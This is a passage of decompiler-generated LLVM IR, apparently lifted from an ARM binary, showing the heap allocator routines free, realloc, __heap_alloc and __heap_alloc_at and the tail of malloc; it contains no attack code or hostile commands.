  store i32 ptrtoint (i32* @global_var_2ca80.984 to i32), i32* %r0.global-to-local, align 4
  %v1_15eb4 = call i32 @__pthread_return_0()
  %v0_15eb8 = load i32, i32* @r4, align 4
  %v0_15ebc = load i32, i32* @r5, align 4
  store i32 ptrtoint (i32** @global_var_26630.988 to i32), i32* %r0.global-to-local, align 4
  %sext = mul i32 %v0_15ebc, 16777216
  %v2_15ec4 = sdiv i32 %sext, 16777216
  %v5_15ec4 = call i32 @__heap_free(i32* bitcast (i32** @global_var_26630.988 to i32*), i32 %v2_15ec4, i32 %v0_15eb8)
  store i32 ptrtoint (i32** @global_var_26630.988 to i32), i32* %r0.global-to-local, align 4
  %v3_15ed0 = call i32 @__heap_alloc(i32* bitcast (i32** @global_var_26630.988 to i32*), i32 %v2_15de4)
  store i32 %v3_15ed0, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2ca80.984 to i32), i32* %r0.global-to-local, align 4
  store i32 89828, i32* @lr, align 4
  %v1_15ee0 = call i32 @__pthread_return_0()
  store i32 %v1_15ee0, i32* %r0.global-to-local, align 4
  %v2_15ee4 = icmp eq i32 %v3_15ed0, 0
  br i1 %v2_15ee4, label %dec_label_pc_15efc, label %dec_label_pc_15eec

dec_label_pc_15eec:                               ; preds = %dec_label_pc_15df8, %dec_label_pc_15ea8
  %v1_15ef0 = phi i32 [ %v3_15e1c, %dec_label_pc_15df8 ], [ %v3_15ed0, %dec_label_pc_15ea8 ]
  %v2_15eec = load i32, i32* %stack_var_-20, align 4
  %v2_15ef0 = inttoptr i32 %v1_15ef0 to i32*
  store i32 %v2_15eec, i32* %v2_15ef0, align 4
  %v3_15ef0 = load i32, i32* %r4.global-to-local, align 4
  %v4_15ef0 = add i32 %v3_15ef0, 4
  store i32 %v4_15ef0, i32* %r4.global-to-local, align 4
  %v2_15ef4 = icmp eq i32 %v4_15ef0, 0
  br i1 %v2_15ef4, label %dec_label_pc_15efc, label %dec_label_pc_15f0c

dec_label_pc_15efc:                               ; preds = %dec_label_pc_15eec, %dec_label_pc_15ea8, %dec_label_pc_15e90, %dec_label_pc_15df0
  %v0_15efc = call i32 @__errno_location()
  store i32 %v0_15efc, i32* %r0.global-to-local, align 4
  %v2_15f04 = inttoptr i32 %v0_15efc to i32*
  store i32 12, i32* %v2_15f04, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15f0c

dec_label_pc_15f0c:                               ; preds = %dec_label_pc_15eec, %dec_label_pc_15efc
  %v0_15f0c = phi i32 [ %v4_15ef0, %dec_label_pc_15eec ], [ 0, %dec_label_pc_15efc ]
  store i32 %v0_15f0c, i32* %r0.global-to-local, align 4
  store i32 %v3_15ddc, i32* @r4, align 4
  store i32 %v6_15ddc, i32* @r5, align 4
  store i32 %v9_15ddc, i32* @r6, align 4
  ret i32 %v0_15f0c

; uselistorder directives
  uselistorder i32 %v0_15f0c, { 1, 0 }
  uselistorder i32 %v3_15ed0, { 1, 0, 2 }
  uselistorder i32 %v1_15e80, { 1, 0, 2 }
  uselistorder i32 %v1_15e6c, { 2, 0, 3, 4, 1, 5 }
  uselistorder i32 %v3_15e1c, { 1, 0, 2 }
  uselistorder i32 %v0_15de0, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 3, 4, 6, 7, 8, 9, 11, 10, 15, 13, 12, 19, 14, 16, 17, 18, 0, 1 }
  uselistorder label %dec_label_pc_15f0c, { 1, 0 }
  uselistorder label %dec_label_pc_15eec, { 1, 0 }
  uselistorder label %dec_label_pc_15e90, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_15df8, { 1, 0 }
}

define i32 @free() local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_15f30 = load i32, i32* @r0, align 4
  %v2_15f30 = icmp eq i32 %v0_15f30, 0
  %v3_15f34 = load i32, i32* @r4, align 4
  store i32 %v3_15f34, i32* %stack_var_-24, align 4
  %v6_15f34 = load i32, i32* @r5, align 4
  %v9_15f34 = load i32, i32* @r6, align 4
  %v15_15f34 = load i32, i32* @r8, align 4
  br i1 %v2_15f30, label %bb, label %bb11

bb:                                               ; preds = %entry
  ret i32 0

bb11:                                             ; preds = %entry
  %v1_15f3c = add i32 %v0_15f30, -4
  %v2_15f3c = inttoptr i32 %v1_15f3c to i32*
  %v3_15f3c = load i32, i32* %v2_15f3c, align 4
  store i32 %v3_15f3c, i32* @r5, align 4
  store i32 ptrtoint (i32** @global_var_26630.988 to i32), i32* %r8.global-to-local, align 4
  store i32 %v1_15f3c, i32* @r4, align 4
  %v1_15f54 = call i32 @__pthread_return_0()
  %v0_15f58 = load i32, i32* @r4, align 4
  %v0_15f5c = load i32, i32* @r5, align 4
  %v4_15f64 = call i32 @__heap_free(i32* bitcast (i32** @global_var_26630.988 to i32*), i32 %v0_15f58, i32 %v0_15f5c)
  %v1_15f6c = inttoptr i32 %v4_15f64 to i32*
  %v2_15f6c = load i32, i32* %v1_15f6c, align 4
  store i32 %v2_15f6c, i32* %r6.global-to-local, align 4
  %v2_15f70 = load i32, i32* @global_var_2caa8.835, align 4
  %v4_15f74 = mul i32 %v2_15f70, 8
  %v6_15f74 = icmp ult i32 %v2_15f6c, %v4_15f74
  store i32 %v4_15f64, i32* @r4, align 4
  br i1 %v6_15f74, label %dec_label_pc_15fb4, label %dec_label_pc_15f80

dec_label_pc_15f80:                               ; preds = %bb11
  %v1_15f88 = call i32 @__pthread_return_0()
  %v1_15f90 = call i32 @__GI_sbrk(i32 0)
  %v0_15f94 = load i32, i32* @r4, align 4
  %v1_15f94 = add i32 %v0_15f94, 12
  store i32 %v1_15f94, i32* @r5, align 4
  %v9_15f98 = icmp eq i32 %v1_15f94, %v1_15f90
  br i1 %v9_15f98, label %dec_label_pc_15fbc, label %dec_label_pc_15fa0

dec_label_pc_15fa0:                               ; preds = %dec_label_pc_15f80
  %v1_15fac = call i32 @__pthread_return_0()
  br label %dec_label_pc_15fb4

dec_label_pc_15fb4:                               ; preds = %bb11, %dec_label_pc_15fa0, %bb14
  %v2_15fb4 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_15fb4, i32* @r4, align 4
  store i32 %v6_15f34, i32* @r5, align 4
  store i32 %v9_15f34, i32* %r6.global-to-local, align 4
  store i32 %v15_15f34, i32* %r8.global-to-local, align 4
  %v0_15fb8 = call i32 @__pthread_return_0()
  %v0_15fbc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_15fbc

dec_label_pc_15fbc:                               ; preds = %dec_label_pc_15f80, %dec_label_pc_15fb4
  %v1_15fc4 = phi i32 [ %v0_15f94, %dec_label_pc_15f80 ], [ %v0_15fbc.pre, %dec_label_pc_15fb4 ]
  %v1_15fbc = add i32 %v1_15fc4, 4
  %v2_15fbc = inttoptr i32 %v1_15fbc to i32*
  %v3_15fbc = load i32, i32* %v2_15fbc, align 4
  %v2_15fc0 = icmp eq i32 %v3_15fbc, 0
  br i1 %v2_15fc0, label %.thread, label %bb12

bb12:                                             ; preds = %dec_label_pc_15fbc
  %v2_15fc4 = add i32 %v1_15fc4, 8
  %v3_15fc4 = inttoptr i32 %v2_15fc4 to i32*
  %v4_15fc4 = load i32, i32* %v3_15fc4, align 4
  %v3_15fc8 = add i32 %v3_15fbc, 8
  %v4_15fc8 = inttoptr i32 %v3_15fc8 to i32*
  store i32 %v4_15fc4, i32* %v4_15fc8, align 4
  %v0_15fcc.pre = load i32, i32* @r4, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_15fbc, %bb12
  %v0_15fcc = phi i32 [ %v1_15fc4, %dec_label_pc_15fbc ], [ %v0_15fcc.pre, %bb12 ]
  %v1_15fcc = add i32 %v0_15fcc, 8
  %v2_15fcc = inttoptr i32 %v1_15fcc to i32*
  %v3_15fcc = load i32, i32* %v2_15fcc, align 4
  %v1_15fd0 = add i32 %v0_15fcc, 4
  %v2_15fd0 = inttoptr i32 %v1_15fd0 to i32*
  %v3_15fd0 = load i32, i32* %v2_15fd0, align 4
  %v2_15fd4 = icmp eq i32 %v3_15fcc, 0
  br i1 %v2_15fd4, label %.thread1, label %bb13

bb13:                                             ; preds = %.thread
  %v3_15fd8 = add i32 %v3_15fcc, 4
  %v4_15fd8 = inttoptr i32 %v3_15fd8 to i32*
  store i32 %v3_15fd0, i32* %v4_15fd8, align 4
  br label %bb14

.thread1:                                         ; preds = %.thread
  %v2_15fdc = load i32, i32* %r8.global-to-local, align 4
  %v3_15fdc = inttoptr i32 %v2_15fdc to i32*
  store i32 %v3_15fd0, i32* %v3_15fdc, align 4
  br label %bb14

bb14:                                             ; preds = %bb13, %.thread1
  %v1_15fec = call i32 @__pthread_return_0()
  %v0_15ff0 = load i32, i32* %r6.global-to-local, align 4
  %v1_15ff0 = load i32, i32* @r4, align 4
  %v0_15ff8 = load i32, i32* @r5, align 4
  %v2_15ff0 = sub i32 12, %v0_15ff0
  %v1_15ff4 = add i32 %v2_15ff0, %v1_15ff0
  %v2_15ff8 = sub i32 %v1_15ff4, %v0_15ff8
  %v1_15ffc = call i32 @__GI_sbrk(i32 %v2_15ff8)
  br label %dec_label_pc_15fb4

; uselistorder directives
  uselistorder i32 %v0_15fcc, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_sbrk, { 2, 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_15fbc, { 1, 0 }
  uselistorder label %dec_label_pc_15fb4, { 2, 1, 0 }
}

define i32 @realloc(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_16020 = load i32, i32* @r4, align 4
  store i32 %v3_16020, i32* %stack_var_-24, align 4
  %v6_16020 = load i32, i32* @r5, align 4
  %v9_16020 = load i32, i32* @r6, align 4
  %v12_16020 = load i32, i32* @r7, align 4
  %v15_16020 = load i32, i32* @r8, align 4
  %v18_16020 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r4, align 4
  %v2_16024 = icmp eq i32 %arg2, 0
  %v0_16028 = load i32, i32* @r0, align 4
  store i32 %v0_16028, i32* @r7, align 4
  br i1 %v2_16024, label %dec_label_pc_16030, label %dec_label_pc_16038

dec_label_pc_16030:                               ; preds = %entry
  %v0_16030 = call i32 @free()
  %v0_16040.pre = load i32, i32* @r4, align 4
  %v2_16044.pre = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_16040

dec_label_pc_16038:                               ; preds = %entry
  %v2_16038 = icmp eq i32 %v0_16028, 0
  br i1 %v2_16038, label %dec_label_pc_16040, label %dec_label_pc_1604c

dec_label_pc_16040:                               ; preds = %dec_label_pc_16038, %dec_label_pc_16030
  %v2_16044 = phi i32 [ %v3_16020, %dec_label_pc_16038 ], [ %v2_16044.pre, %dec_label_pc_16030 ]
  %v0_16040 = phi i32 [ %arg2, %dec_label_pc_16038 ], [ %v0_16040.pre, %dec_label_pc_16030 ]
  store i32 %v2_16044, i32* @r4, align 4
  store i32 %v6_16020, i32* @r5, align 4
  store i32 %v9_16020, i32* @r6, align 4
  store i32 %v12_16020, i32* @r7, align 4
  store i32 %v18_16020, i32* @lr, align 4
  %v1_16048 = call i32 @malloc(i32 %v0_16040)
  %v0_1604c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1604c

dec_label_pc_1604c:                               ; preds = %dec_label_pc_16038, %dec_label_pc_16040
  %v0_16064 = phi i32 [ %v0_16028, %dec_label_pc_16038 ], [ %v1_16048, %dec_label_pc_16040 ]
  %v0_1604c = phi i32 [ %arg2, %dec_label_pc_16038 ], [ %v0_1604c.pre, %dec_label_pc_16040 ]
  %v1_1604c = add i32 %v0_1604c, 7
  %v1_16050 = and i32 %v1_1604c, -4
  store i32 %v1_16050, i32* @r5, align 4
  %v2_16054 = icmp ugt i32 %v1_16050, 10
  %v1_16058 = add i32 %v0_16064, -4
  %v2_16058 = inttoptr i32 %v1_16058 to i32*
  %v3_16058 = load i32, i32* %v2_16058, align 4
  store i32 %v3_16058, i32* @r6, align 4
  br i1 %v2_16054, label %bb14, label %bb

bb:                                               ; preds = %dec_label_pc_1604c
  store i32 12, i32* @r5, align 4
  br label %bb14

bb14:                                             ; preds = %dec_label_pc_1604c, %bb
  %v0_160e0 = phi i32 [ %v1_16050, %dec_label_pc_1604c ], [ 12, %bb ]
  store i32 %v1_16058, i32* @r8, align 4
  %tmp = icmp ugt i32 %v0_160e0, %v3_16058
  br i1 %tmp, label %dec_label_pc_1606c, label %dec_label_pc_160e0

dec_label_pc_1606c:                               ; preds = %bb14
  %v2_16060 = sub i32 %v0_160e0, %v3_16058
  %v1_1607c = call i32 @__pthread_return_0()
  %v0_16084 = load i32, i32* @r8, align 4
  %v1_16084 = load i32, i32* @r6, align 4
  %v2_16084 = add i32 %v1_16084, %v0_16084
  %v4_1608c = call i32 @__heap_alloc_at(i32* bitcast (i32** @global_var_26630.988 to i32*), i32 %v2_16084, i32 %v2_16060)
  store i32 %v4_1608c, i32* @r4, align 4
  store i32 90276, i32* @lr, align 4
  %v1_160a0 = call i32 @__pthread_return_0()
  %v0_160a4 = load i32, i32* @r4, align 4
  %v2_160a4 = icmp eq i32 %v0_160a4, 0
  br i1 %v2_160a4, label %dec_label_pc_160b4, label %.thread

.thread:                                          ; preds = %dec_label_pc_1606c
  %v1_160a8 = load i32, i32* @r6, align 4
  %v3_160a8 = add i32 %v1_160a8, %v0_160a4
  %v2_160ac = load i32, i32* @r7, align 4
  %v3_160ac = add i32 %v2_160ac, -4
  %v4_160ac = inttoptr i32 %v3_160ac to i32*
  store i32 %v3_160a8, i32* %v4_160ac, align 4
  br label %dec_label_pc_16120

dec_label_pc_160b4:                               ; preds = %dec_label_pc_1606c
  %v0_160b4 = load i32, i32* @r5, align 4
  %v1_160b4 = add i32 %v0_160b4, -4
  %v1_160b8 = call i32 @malloc(i32 %v1_160b4)
  store i32 %v1_160b8, i32* @r0, align 4
  store i32 %v1_160b8, i32* @r4, align 4
  %v2_160bc = icmp eq i32 %v1_160b8, 0
  br i1 %v2_160bc, label %dec_label_pc_160d8, label %dec_label_pc_160c4

dec_label_pc_160c4:                               ; preds = %dec_label_pc_160b4
  %v0_160c4 = load i32, i32* @r6, align 4
  %v1_160c4 = add i32 %v0_160c4, -4
  store i32 %v1_160c4, i32* @r2, align 4
  %v0_160c8 = load i32, i32* @r7, align 4
  store i32 %v0_160c8, i32* @r1, align 4
  %v0_160cc = call i32 @memcpy()
  %v0_160d0 = load i32, i32* @r7, align 4
  store i32 %v0_160d0, i32* @r0, align 4
  %v0_160d4 = call i32 @free()
  %v0_160d8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_160d8

dec_label_pc_160d8:                               ; preds = %dec_label_pc_160b4, %dec_label_pc_160c4
  %v0_160d8 = phi i32 [ 0, %dec_label_pc_160b4 ], [ %v0_160d8.pre, %dec_label_pc_160c4 ]
  store i32 %v0_160d8, i32* @r7, align 4
  br label %dec_label_pc_16120

dec_label_pc_160e0:                               ; preds = %bb14
  %v1_160e0 = add i32 %v0_160e0, 28
  %tmp15 = icmp ugt i32 %v1_160e0, %v3_16058
  br i1 %tmp15, label %dec_label_pc_16120, label %dec_label_pc_160ec

dec_label_pc_160ec:                               ; preds = %dec_label_pc_160e0
  %v1_160f8 = call i32 @__pthread_return_0()
  %v0_160fc = load i32, i32* @r8, align 4
  %v1_160fc = load i32, i32* @r5, align 4
  %v2_160fc = add i32 %v1_160fc, %v0_160fc
  %v1_16100 = load i32, i32* @r6, align 4
  %v2_16100 = sub i32 %v1_16100, %v1_160fc
  %v4_16108 = call i32 @__heap_free(i32* bitcast (i32** @global_var_26630.988 to i32*), i32 %v2_160fc, i32 %v2_16100)
  store i32 90396, i32* @lr, align 4
  %v1_16118 = call i32 @__pthread_return_0()
  %v0_1611c = load i32, i32* @r5, align 4
  %v1_1611c = load i32, i32* @r7, align 4
  %v2_1611c = add i32 %v1_1611c, -4
  %v3_1611c = inttoptr i32 %v2_1611c to i32*
  store i32 %v0_1611c, i32* %v3_1611c, align 4
  br label %dec_label_pc_16120

dec_label_pc_16120:                               ; preds = %.thread, %dec_label_pc_160e0, %dec_label_pc_160d8, %dec_label_pc_160ec
  %v0_16120 = load i32, i32* @r7, align 4
  store i32 %v9_16020, i32* @r6, align 4
  store i32 %v15_16020, i32* @r8, align 4
  ret i32 %v0_16120

; uselistorder directives
  uselistorder i32 %v1_160fc, { 1, 0 }
  uselistorder i32 %v0_160e0, { 1, 2, 0 }
  uselistorder i32 %v3_16058, { 0, 2, 1, 3 }
  uselistorder i32** @global_var_26630.988, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_26630.988 to i32*), { 1, 2, 0, 3, 4, 5 }
  uselistorder label %dec_label_pc_16120, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_160d8, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %dec_label_pc_1604c, { 1, 0 }
}

define i32 @__heap_alloc(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v1_16138 = inttoptr i32 %arg2 to i32*
  %v2_16138 = load i32, i32* %v1_16138, align 4
  %v3_1613c = load i32, i32* @r4, align 4
  store i32 %v3_1613c, i32* %stack_var_-8, align 4
  %v1_16140 = add i32 %v2_16138, 3
  %v1_16144 = and i32 %v1_16140, -4
  store i32 %v1_16144, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_1614c = icmp ugt i32 %v1_16144, 10
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_16154 = load i32, i32* %arg1, align 4
  store i32 %v2_16154, i32* %r0.global-to-local, align 4
  br i1 %v2_1614c, label %dec_label_pc_161c0.preheader, label %bb

bb:                                               ; preds = %entry
  store i32 12, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_161c0.preheader

dec_label_pc_161c0.preheader:                     ; preds = %entry, %bb
  %v1_16174 = phi i32 [ %v1_16144, %entry ], [ 12, %bb ]
  %v2_161c09 = icmp eq i32 %v2_16154, 0
  br i1 %v2_161c09, label %dec_label_pc_161c8, label %dec_label_pc_16160

dec_label_pc_16160:                               ; preds = %dec_label_pc_161c0.preheader, %dec_label_pc_161bc
  %v2_16178 = phi i32 [ %v3_161bc, %dec_label_pc_161bc ], [ %v2_16154, %dec_label_pc_161c0.preheader ]
  %v1_16160 = inttoptr i32 %v2_16178 to i32*
  %v2_16160 = load i32, i32* %v1_16160, align 4
  store i32 %v2_16160, i32* @ip, align 4
  %v3_16164 = icmp ult i32 %v2_16160, %v1_16174
  br i1 %v3_16164, label %dec_label_pc_161bc, label %dec_label_pc_1616c

dec_label_pc_1616c:                               ; preds = %dec_label_pc_16160
  %v1_1616c = add i32 %v1_16174, 44
  %v3_16170 = icmp ult i32 %v2_16160, %v1_1616c
  br i1 %v3_16170, label %dec_label_pc_16180, label %.thread._crit_edge

.thread._crit_edge:                               ; preds = %dec_label_pc_1616c
  %v2_16164.le = sub i32 %v2_16160, %v1_16174
  store i32 %v2_16164.le, i32* %v1_16160, align 4
  %v0_161ac.pre = load i32, i32* @ip, align 4
  %v0_161b4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb29

dec_label_pc_16180:                               ; preds = %dec_label_pc_1616c
  %v1_16180 = add i32 %v2_16178, 4
  %v2_16180 = inttoptr i32 %v1_16180 to i32*
  %v3_16180 = load i32, i32* %v2_16180, align 4
  store i32 %v3_16180, i32* %r2.global-to-local, align 4
  %v2_16184 = icmp eq i32 %v3_16180, 0
  br i1 %v2_16184, label %.thread2, label %bb27

bb27:                                             ; preds = %dec_label_pc_16180
  %v2_16188 = add i32 %v2_16178, 8
  %v3_16188 = inttoptr i32 %v2_16188 to i32*
  %v4_16188 = load i32, i32* %v3_16188, align 4
  %v3_1618c = add i32 %v3_16180, 8
  %v4_1618c = inttoptr i32 %v3_1618c to i32*
  store i32 %v4_16188, i32* %v4_1618c, align 4
  %v0_16190.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_16180, %bb27
  %v0_16190 = phi i32 [ %v2_16178, %dec_label_pc_16180 ], [ %v0_16190.pre, %bb27 ]
  %v1_16190 = add i32 %v0_16190, 8
  %v2_16190 = inttoptr i32 %v1_16190 to i32*
  %v3_16190 = load i32, i32* %v2_16190, align 4
  %v1_16194 = add i32 %v0_16190, 4
  %v2_16194 = inttoptr i32 %v1_16194 to i32*
  %v3_16194 = load i32, i32* %v2_16194, align 4
  %v2_16198 = icmp eq i32 %v3_16190, 0
  br i1 %v2_16198, label %.thread5, label %bb28

bb28:                                             ; preds = %.thread2
  %v3_1619c = add i32 %v3_16190, 4
  %v4_1619c = inttoptr i32 %v3_1619c to i32*
  store i32 %v3_16194, i32* %v4_1619c, align 4
  %v1_161a4 = load i32, i32* @ip, align 4
  store i32 %v1_161a4, i32* %r2.global-to-local, align 4
  br label %bb29

.thread5:                                         ; preds = %.thread2
  %v2_161a0 = load i32, i32* %r1.global-to-local, align 4
  %v3_161a0 = inttoptr i32 %v2_161a0 to i32*
  store i32 %v3_16194, i32* %v3_161a0, align 4
  %v1_161a8.pre = load i32, i32* @ip, align 4
  store i32 %v1_161a8.pre, i32* %r2.global-to-local, align 4
  br label %bb29

bb29:                                             ; preds = %bb28, %.thread._crit_edge, %.thread5
  %v0_161b4 = phi i32 [ %v0_161b4.pre, %.thread._crit_edge ], [ %v1_161a4, %bb28 ], [ %v1_161a8.pre, %.thread5 ]
  %v0_161ac = phi i32 [ %v0_161ac.pre, %.thread._crit_edge ], [ %v1_161a4, %bb28 ], [ %v1_161a8.pre, %.thread5 ]
  %v1_161ac = load i32, i32* %r0.global-to-local, align 4
  %v2_161ac = sub i32 %v1_161ac, %v0_161ac
  %v1_161b0 = add i32 %v2_161ac, 12
  store i32 %v1_161b0, i32* %r0.global-to-local, align 4
  %v1_161b4 = load i32, i32* %r4.global-to-local, align 4
  %v2_161b4 = inttoptr i32 %v1_161b4 to i32*
  store i32 %v0_161b4, i32* %v2_161b4, align 4
  %v2_161b8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_161b8, i32* %r4.global-to-local, align 4
  ret i32 %v1_161b0

dec_label_pc_161bc:                               ; preds = %dec_label_pc_16160
  %v1_161bc = add i32 %v2_16178, 4
  %v2_161bc = inttoptr i32 %v1_161bc to i32*
  %v3_161bc = load i32, i32* %v2_161bc, align 4
  store i32 %v3_161bc, i32* %r0.global-to-local, align 4
  %v2_161c0 = icmp eq i32 %v3_161bc, 0
  br i1 %v2_161c0, label %dec_label_pc_161c0.dec_label_pc_161c8_crit_edge, label %dec_label_pc_16160

dec_label_pc_161c0.dec_label_pc_161c8_crit_edge:  ; preds = %dec_label_pc_161bc
  br label %dec_label_pc_161c8

dec_label_pc_161c8:                               ; preds = %dec_label_pc_161c0.dec_label_pc_161c8_crit_edge, %dec_label_pc_161c0.preheader
  store i32 %v3_1613c, i32* %r4.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_161bc, { 1, 2, 0 }
  uselistorder i32 %v0_16190, { 1, 0 }
  uselistorder i32 %v2_16160, { 1, 0, 2, 3 }
  uselistorder i32 %v2_16178, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_16174, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 4, 3, 5, 0 }
  uselistorder label %bb29, { 2, 0, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_16160, { 1, 0 }
  uselistorder label %dec_label_pc_161c0.preheader, { 1, 0 }
}

define i32 @__heap_alloc_at(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v2_161d0 = load i32, i32* %arg1, align 4
  store i32 %v2_161d0, i32* %ip.global-to-local, align 4
  store i32 %tmp, i32* %lr.global-to-local, align 4
  %v2_162486 = icmp eq i32 %v2_161d0, 0
  br i1 %v2_162486, label %dec_label_pc_16250, label %dec_label_pc_161dc

dec_label_pc_161dc:                               ; preds = %entry, %dec_label_pc_16244
  %v0_1621c = phi i32 [ %v3_16244, %dec_label_pc_16244 ], [ %v2_161d0, %entry ]
  %v1_161dc = inttoptr i32 %v0_1621c to i32*
  %v2_161dc = load i32, i32* %v1_161dc, align 4
  store i32 %v2_161dc, i32* %r0.global-to-local, align 4
  %v2_161e0 = sub i32 %v0_1621c, %v2_161dc
  %v1_161e4 = add i32 %v2_161e0, 12
  %v3_161e8 = icmp uge i32 %v1_161e4, %arg2
  %v9_161e8 = icmp eq i32 %v1_161e4, %arg2
  %v2_161ec = xor i1 %v9_161e8, true
  %v3_161ec = and i1 %v3_161e8, %v2_161ec
  br i1 %v3_161ec, label %dec_label_pc_16244, label %dec_label_pc_161f0

dec_label_pc_161f0:                               ; preds = %dec_label_pc_161dc
  br i1 %v9_161e8, label %dec_label_pc_161f4, label %dec_label_pc_16250

dec_label_pc_161f4:                               ; preds = %dec_label_pc_161f0
  %v1_161f4 = add i32 %arg3, 3
  %v1_161f8 = and i32 %v1_161f4, -4
  store i32 %v1_161f8, i32* %r2.global-to-local, align 4
  %v2_161fc = sub i32 %v2_161dc, %v1_161f8
  %v3_161fc = icmp ult i32 %v2_161dc, %v1_161f8
  br i1 %v3_161fc, label %dec_label_pc_16250, label %dec_label_pc_16204

dec_label_pc_16204:                               ; preds = %dec_label_pc_161f4
  %v1_16204 = add i32 %v1_161f8, 44
  %v3_16208 = icmp ult i32 %v2_161dc, %v1_16204
  br i1 %v3_16208, label %.thread2, label %bb

bb:                                               ; preds = %dec_label_pc_16204
  store i32 %v2_161fc, i32* %v1_161dc, align 4
  %v1_16214 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_16214, i32* %r0.global-to-local, align 4
  ret i32 %v1_16214

.thread2:                                         ; preds = %dec_label_pc_16204
  %v1_1621c = add i32 %v0_1621c, 4
  %v2_1621c = inttoptr i32 %v1_1621c to i32*
  %v3_1621c = load i32, i32* %v2_1621c, align 4
  store i32 %v3_1621c, i32* %r2.global-to-local, align 4
  %v2_16220 = icmp eq i32 %v3_1621c, 0
  br i1 %v2_16220, label %.thread3, label %bb17

bb17:                                             ; preds = %.thread2
  %v2_16224 = add i32 %v0_1621c, 8
  %v3_16224 = inttoptr i32 %v2_16224 to i32*
  %v4_16224 = load i32, i32* %v3_16224, align 4
  %v3_16228 = add i32 %v3_1621c, 8
  %v4_16228 = inttoptr i32 %v3_16228 to i32*
  store i32 %v4_16224, i32* %v4_16228, align 4
  %v0_1622c.pre = load i32, i32* %ip.global-to-local, align 4
  br label %.thread3

.thread3:                                         ; preds = %.thread2, %bb17
  %v0_1622c = phi i32 [ %v0_1621c, %.thread2 ], [ %v0_1622c.pre, %bb17 ]
  %v1_1622c = add i32 %v0_1622c, 8
  %v2_1622c = inttoptr i32 %v1_1622c to i32*
  %v3_1622c = load i32, i32* %v2_1622c, align 4
  store i32 %v3_1622c, i32* %r2.global-to-local, align 4
  %v1_16230 = add i32 %v0_1622c, 4
  %v2_16230 = inttoptr i32 %v1_16230 to i32*
  %v3_16230 = load i32, i32* %v2_16230, align 4
  %v2_16234 = icmp eq i32 %v3_1622c, 0
  br i1 %v2_16234, label %.thread4, label %bb18

bb18:                                             ; preds = %.thread3
  %v3_16238 = add i32 %v3_1622c, 4
  %v4_16238 = inttoptr i32 %v3_16238 to i32*
  store i32 %v3_16230, i32* %v4_16238, align 4
  br label %bb19

.thread4:                                         ; preds = %.thread3
  %v2_1623c = load i32, i32* %lr.global-to-local, align 4
  %v3_1623c = inttoptr i32 %v2_1623c to i32*
  store i32 %v3_16230, i32* %v3_1623c, align 4
  br label %bb19

bb19:                                             ; preds = %bb18, %.thread4
  %v5_16240 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v5_16240

dec_label_pc_16244:                               ; preds = %dec_label_pc_161dc
  %v1_16244 = add i32 %v0_1621c, 4
  %v2_16244 = inttoptr i32 %v1_16244 to i32*
  %v3_16244 = load i32, i32* %v2_16244, align 4
  store i32 %v3_16244, i32* %ip.global-to-local, align 4
  %v2_16248 = icmp eq i32 %v3_16244, 0
  br i1 %v2_16248, label %dec_label_pc_16248.dec_label_pc_16250.loopexit_crit_edge, label %dec_label_pc_161dc

dec_label_pc_16248.dec_label_pc_16250.loopexit_crit_edge: ; preds = %dec_label_pc_16244
  br label %dec_label_pc_16250

